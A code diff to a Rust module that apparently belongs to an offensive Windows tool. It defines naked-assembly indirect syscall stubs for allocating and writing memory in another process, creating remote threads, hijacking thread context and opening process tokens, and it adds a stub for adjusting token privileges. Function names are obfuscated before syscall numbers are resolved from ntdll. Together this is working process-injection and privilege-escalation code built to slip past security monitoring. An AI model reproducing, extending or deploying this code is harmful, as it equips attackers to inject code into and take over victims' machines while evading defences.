@@ -2,7 +2,7 @@ use std::arch::naked_asm;
 use std::ffi::c_void;
 
 use ntapi::ntapi_base::CLIENT_ID;
-use winapi::um::winnt::{HANDLE, CONTEXT, TOKEN_INFORMATION_CLASS};
+use winapi::um::winnt::{HANDLE, CONTEXT, TOKEN_INFORMATION_CLASS, TOKEN_PRIVILEGES};
 use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
 use obfuse::obfuse;
 use anyhow::anyhow;
@@ -43,104 +43,198 @@ pub enum NtIndex {
     ZwOpenProcess = 14,
     NtOpenProcessToken = 15,
     NtQueryInformationToken = 16,
+    NtAdjustPrivilegesToken = 17,
 }
 
-const NT_FUNCTION_COUNT: usize = 17;
+const NT_FUNCTION_COUNT: usize = 18;
 
-
+// ═══════════════════════════════════════════════════
+// NtAllocateVirtualMemory (ZwAllocateVirtualMemory)
+// ═══════════════════════════════════════════════════
 #[unsafe(naked)]
 #[unsafe(no_mangle)]
-pub unsafe extern "win64" fn zw_allocate_virtual_memory(process_handle: HANDLE, base_address: *mut *mut c_void, zero_bits: u64, region_size: *mut usize, allocation_type: u64, protect: u64, ssn: u32, syscall_ret: *mut u8) -> i32
-{
+pub unsafe extern "win64" fn zw_allocate_virtual_memory(
+    process_handle:  HANDLE,
+    base_address:    *mut *mut c_void,
+    zero_bits:       u64,
+    region_size:     *mut usize,
+    allocation_type: u64,
+    protect:         u64,
+    ssn:             u32,
+    syscall_ret:     *mut u8,
+) -> i32 {
     naked_asm!(
         "mov r10, rcx",
-        "mov eax, dword ptr[rsp+56]",
-        "jmp qword ptr[rsp+64]"
-    )
-}
-#[unsafe(naked)]
-#[unsafe(no_mangle)]
-pub unsafe extern "win64" fn zw_open_process(process_handle: *mut HANDLE, desired_access: u32, object_attributes: *mut OBJECT_ATTRIBUTES, client_id: *mut CLIENT_ID, ssn: u32, syscall_ret: *mut u8) -> i32
-{
-    naked_asm!(
-        "mov r10, rcx",
-        "mov eax, dword ptr[rsp+40]",
-        "jmp qword ptr[rsp+48]"
-    )
-
-}
-
-#[unsafe(naked)]
-#[unsafe(no_mangle)]
-pub unsafe extern "win64" fn zw_create_thread_ex(thread_handle: *mut HANDLE, desired_access: u32, object_attributes: *mut OBJECT_ATTRIBUTES, process_handle: HANDLE, start_roution: *mut c_void, argument: *mut c_void, create_flags: u64, zero_bits: usize, stack_size: usize, max_stack_size: usize, attribute_list: *mut c_void, ssn: u32, syscall_ret: *mut u8) -> i32
-{
-    naked_asm!(
-        "mov r10, rcx",
-        "mov eax, dword ptr[rsp+96]",
-        "jmp qword ptr[rsp+104]"
+        "mov eax, dword ptr [rsp + 56]",
+        "jmp qword ptr [rsp + 64]"
     )
 }
 
+// ═══════════════════════════════════════════════════
+// NtOpenProcess (ZwOpenProcess)
+// ═══════════════════════════════════════════════════
 #[unsafe(naked)]
 #[unsafe(no_mangle)]
-pub unsafe extern "win64" fn zw_write_virtual_memory(process_handle: HANDLE, base_address: *mut c_void, buffer: *mut c_void, number_of_bytes_to_write: usize, number_of_bytes_written: *mut usize, ssn: u32, syscall_ret: *mut u8) -> i32
-{
+pub unsafe extern "win64" fn zw_open_process(
+    process_handle:     *mut HANDLE,
+    desired_access:     u32,
+    object_attributes:  *mut OBJECT_ATTRIBUTES,
+    client_id:          *mut CLIENT_ID,
+    ssn:                u32,
+    syscall_ret:        *mut u8,
+) -> i32 {
     naked_asm!(
         "mov r10, rcx",
-        "mov eax, dword ptr[rsp+48]",
-        "jmp qword ptr[rsp+56]"
+        "mov eax, dword ptr [rsp + 40]",
+        "jmp qword ptr [rsp + 48]"
     )
-
 }
 
+// ═══════════════════════════════════════════════════
+// NtCreateThreadEx (ZwCreateThreadEx)
+// ═══════════════════════════════════════════════════
 #[unsafe(naked)]
 #[unsafe(no_mangle)]
-pub unsafe extern "win64" fn zw_get_context_thread(thread_handle: HANDLE, context: *mut CONTEXT, ssn: u32, syscall_ret: *mut u8) -> i32
-{
+pub unsafe extern "win64" fn zw_create_thread_ex(
+    thread_handle:      *mut HANDLE,
+    desired_access:     u32,
+    object_attributes:  *mut OBJECT_ATTRIBUTES,
+    process_handle:     HANDLE,
+    start_routine:      *mut c_void,
+    argument:           *mut c_void,
+    create_flags:       u64,
+    zero_bits:          usize,
+    stack_size:         usize,
+    max_stack_size:     usize,
+    attribute_list:     *mut c_void,
+    ssn:                u32,
+    syscall_ret:        *mut u8,
+) -> i32 {
+    naked_asm!(
+        "mov r10, rcx",
+        "mov eax, dword ptr [rsp + 96]",
+        "jmp qword ptr [rsp + 104]"
+    )
+}
+
+// ═══════════════════════════════════════════════════
+// NtWriteVirtualMemory (ZwWriteVirtualMemory)
+// ═══════════════════════════════════════════════════
+#[unsafe(naked)]
+#[unsafe(no_mangle)]
+pub unsafe extern "win64" fn zw_write_virtual_memory(
+    process_handle:         HANDLE,
+    base_address:           *mut c_void,
+    buffer:                 *mut c_void,
+    number_of_bytes_to_write: usize,
+    number_of_bytes_written: *mut usize,
+    ssn:                    u32,
+    syscall_ret:            *mut u8,
+) -> i32 {
+    naked_asm!(
+        "mov r10, rcx",
+        "mov eax, dword ptr [rsp + 48]",
+        "jmp qword ptr [rsp + 56]"
+    )
+}
+
+// ═══════════════════════════════════════════════════
+// NtGetContextThread (ZwGetContextThread)
+// ═══════════════════════════════════════════════════
+#[unsafe(naked)]
+#[unsafe(no_mangle)]
+pub unsafe extern "win64" fn zw_get_context_thread(
+    thread_handle:  HANDLE,
+    context:        *mut CONTEXT,
+    ssn:            u32,
+    syscall_ret:    *mut u8,
+) -> i32 {
     naked_asm!(
         "mov r10, rcx",
         "mov eax, r8d",
         "jmp r9"
     )
-
 }
 
-
+// ═══════════════════════════════════════════════════
+// NtSetContextThread (ZwSetContextThread)
+// ═══════════════════════════════════════════════════
 #[unsafe(naked)]
 #[unsafe(no_mangle)]
-pub unsafe extern "win64" fn zw_set_context_thread(thread_handle: HANDLE, context: *mut CONTEXT, ssn: u32, syscall_ret: *mut u8) -> i32
-{
+pub unsafe extern "win64" fn zw_set_context_thread(
+    thread_handle:  HANDLE,
+    context:        *mut CONTEXT,
+    ssn:            u32,
+    syscall_ret:    *mut u8,
+) -> i32 {
     naked_asm!(
         "mov r10, rcx",
         "mov eax, r8d",
         "jmp r9"
     )
-
 }
 
+// ═══════════════════════════════════════════════════
+// NtOpenProcessToken
+// ═══════════════════════════════════════════════════
 #[unsafe(naked)]
 #[unsafe(no_mangle)]
-pub unsafe extern "win64" fn nt_open_process_token(process_handle: HANDLE, desired_access: u32, token_handle: *mut HANDLE, ssn: u32, syscall_ret: *mut u8) -> i32
-{
+pub unsafe extern "win64" fn nt_open_process_token(
+    process_handle: HANDLE,
+    desired_access: u32,
+    token_handle:   *mut HANDLE,
+    ssn:            u32,
+    syscall_ret:    *mut u8,
+) -> i32 {
     naked_asm!(
         "mov r10, rcx",
         "mov eax, r9d",
-        "jmp qword ptr[rsp+40]"
+        "jmp qword ptr [rsp + 40]"
     )
 }
 
-
+// ═══════════════════════════════════════════════════
+// NtQueryInformationToken
+// ═══════════════════════════════════════════════════
 #[unsafe(naked)]
 #[unsafe(no_mangle)]
-pub unsafe extern "win64" fn nt_query_information_token(token_handle: HANDLE, token_information_class: TOKEN_INFORMATION_CLASS, token_information: *mut c_void, token_information_lenght: u64, return_lenght: *mut u64, ssn: u32, syscall_ret: *mut u8) -> i32
-{
+pub unsafe extern "win64" fn nt_query_information_token(
+    token_handle:               HANDLE,
+    token_information_class:    TOKEN_INFORMATION_CLASS,
+    token_information:          *mut c_void,
+    token_information_length:   u64,
+    return_length:              *mut u64,
+    ssn:                        u32,
+    syscall_ret:                *mut u8,
+) -> i32 {
     naked_asm!(
         "mov r10, rcx",
-        "mov eax, dword ptr[rsp+48]",
-        "jmp qword ptr[rsp+56]"
+        "mov eax, dword ptr [rsp + 48]",
+        "jmp qword ptr [rsp + 56]"
     )
 }
 
+// ═══════════════════════════════════════════════════
+// NtAdjustPrivilegesToken
+// ═══════════════════════════════════════════════════
+#[unsafe(naked)]
+#[unsafe(no_mangle)]
+pub unsafe extern "win64" fn nt_adjust_privileges_token(
+    token_handle:               HANDLE,
+    disable_all_privileges:     u8,                     // BOOLEAN
+    new_state:                  *mut TOKEN_PRIVILEGES,
+    buffer_length:              u32,
+    previous_state:             *mut TOKEN_PRIVILEGES,
+    return_length:              *mut u32,
+    ssn:                        u32,
+    syscall_addr:               *mut u8,
+) -> i32 {
+    naked_asm!(
+        "mov r10, rcx",
+        "mov eax, dword ptr [rsp + 56]",
+        "jmp qword ptr [rsp + 64]"
+    )
+}
 
 
 macro_rules! set_nt_ssn {
@@ -185,6 +279,7 @@ pub fn init_nt_api() -> Result<(), anyhow::Error>{
     let obfused_nt_create_thread_ex = obfuse!("NtCreateThreadEx");
     let obfused_nt_open_process_token = obfuse!("NtOpenProcessToken");
     let obfused_nt_query_information_token = obfuse!("NtQueryInformationToken");
+    let obfused_nt_adjust_privileges_token = obfuse!("NtAdjustPrivilegesToken");
 
     let str_nt_open_process = obfused_nt_open_process.as_str();
     let str_nt_allocate_virtual_memory = obfused_nt_allocate_virtual_memory.as_str();
@@ -194,6 +289,7 @@ pub fn init_nt_api() -> Result<(), anyhow::Error>{
     let str_zw_set_context_thread = obfused_zw_set_context_thread.as_str();
     let str_nt_open_process_token = obfused_nt_open_process_token.as_str();
     let str_nt_query_information_token = obfused_nt_query_information_token.as_str();
+    let str_nt_adjust_privileges_token = obfused_nt_adjust_privileges_token.as_str();
 
     let ntdll_ptr: *mut u8 = unsafe { get_module_handle(ntdll_str) };
     let parser =  PeModuleParser::new(ntdll_ptr);
@@ -206,6 +302,7 @@ pub fn init_nt_api() -> Result<(), anyhow::Error>{
     set_nt_ssn!(parser, str_zw_set_context_thread, NtIndex::ZwSetContextThread);
     set_nt_ssn!(parser, str_nt_open_process_token, NtIndex::NtOpenProcessToken);
     set_nt_ssn!(parser, str_nt_query_information_token, NtIndex::NtQueryInformationToken);
+    set_nt_ssn!(parser, str_nt_adjust_privileges_token, NtIndex::NtAdjustPrivilegesToken);
 
     debug_println!("[INFO] NT API initialized successfully.");
     
